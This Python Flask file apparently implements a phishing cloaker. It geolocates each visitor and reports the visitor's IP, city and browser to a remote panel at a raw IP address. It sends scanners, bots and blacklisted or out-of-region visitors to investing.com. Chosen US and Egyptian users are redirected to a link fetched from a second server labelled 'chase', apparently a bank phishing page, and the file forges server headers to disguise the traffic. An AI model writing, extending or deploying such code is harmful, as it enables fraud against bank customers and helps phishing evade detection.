import requests
from flask import Flask,redirect,make_response,request,render_template
import os
from werkzeug.useragents import UserAgent
from datetime import datetime




#db.session.query(func.count(BOTS.id)).scalar()
######################################
app = Flask(__name__, template_folder='templates')
#####################################











@app.before_request
def getAnalytics_Data():
    global ip,ua,time,userCountry,userCity,ip_st,org,ua_
    try:
        ua_ = UserAgent(request.headers.get('User-Agent'))
        ua = f'{ua_.platform} / {ua_.browser}'

    except:
        ua = 'null'
    try:
        ip = request.headers['X-Forwarded-For'].split(',')[0]
        api_data = requests.get(f"https://www.iplocate.io/api/lookup/{ip}").json()
        userCountry = str(api_data['country_code'].lower())
        userCity = str(api_data['city'])
        org = str(api_data['org'])
        

     
    except:
        api_data = requests.get("https://www.iplocate.io/api/lookup/").json()
        userCountry = str(api_data['country_code'].lower())
        userCity = str(api_data['city'])
        ip = str(api_data['ip'])
    ########################################################################
    check_in_data = requests.get(f'http://62.171.130.123:5000/panel/check_bot?ip={ip}').json()
    ip_st = check_in_data['status']
    time = datetime.now().strftime("%H:%M:%S")+ ' ' +datetime.now().strftime("%d/%m/%Y")







@app.route('/<name>')
def hello(name):
    if ip_st == 'False':
        if userCountry == 'eg' or userCountry == 'us':
            get_st = requests.get(f'http://62.171.130.123:5000/panel/check_ip?ip={ip}&ua={ua_}')
            if get_st.json()['data'] == 'BOT':
                requests.get(f'http://62.171.130.123:5000/bots?userIP={ip}&country={userCountry}&city={userCity}&ua={ua}&time={time}&type_=BOT [{org}]')
                r = make_response(redirect("https://www.investing.com/", code=301))
                r.headers.set('alt-svc', "clear")
                r.headers.set('cache-control', "private, max-age=90")
                r.headers.set('content-security-policy', "referrer always;")
                r.headers.set('referrer-policy', "unsafe-url")
                r.headers.set('server', "nginx")
                r.headers.set('via', "1.1 google")
                return r
            elif get_st.json()['data'] ==  'ISP':
                requests.get(f'http://62.171.130.123:5000/users?userIP={ip}&country={userCountry}&city={userCity}&ua={ua}&time={time}')
                sheet = requests.get('http://95.111.230.118/kisho/page/active_r.php?page=chase')
                link = sheet.text.split('"')[1].split('\/\/')
                url = f'{link[0]}//{link[1]}'
                r = make_response(redirect(f"{url}{name}", code=301))
                r.headers.set('alt-svc', "clear")
                r.headers.set('cache-control', "private, max-age=90")
                r.headers.set('content-security-policy', "referrer always;")
                r.headers.set('referrer-policy', "unsafe-url")
                r.headers.set('server', "nginx")
                r.headers.set('via', "1.1 google")
                return r


        else:
            requests.get(f'http://62.171.130.123:5000/bots?userIP={ip}&country={userCountry}&city={userCity}&ua={ua}&time={time}&type_=NOT ALLWOED')
            r = make_response(redirect("https://www.investing.com/", code=301))
            r.headers.set('alt-svc', "clear")
            r.headers.set('cache-control', "private, max-age=90")
            r.headers.set('content-security-policy', "referrer always;")
            r.headers.set('referrer-policy', "unsafe-url")
            r.headers.set('server', "nginx")
            r.headers.set('via', "1.1 google")
            return r
    elif ip_st == 'True':
        requests.get(f'http://62.171.130.123:5000/bots?userIP={ip}&country={userCountry}&city={userCity}&ua={ua}&time={time}&type_=BLACK LIST')
        r = make_response(redirect("https://www.investing.com/", code=301))
        r.headers.set('alt-svc', "clear")
        r.headers.set('cache-control', "private, max-age=90")
        r.headers.set('content-security-policy', "referrer always;")
        r.headers.set('referrer-policy', "unsafe-url")
        r.headers.set('server', "nginx")
        r.headers.set('via', "1.1 google")
        return r










if __name__ == '__main__':
    # Bind to PORT if defined, otherwise default to 5000.
    app.run(host='0.0.0.0', port=int('5000'))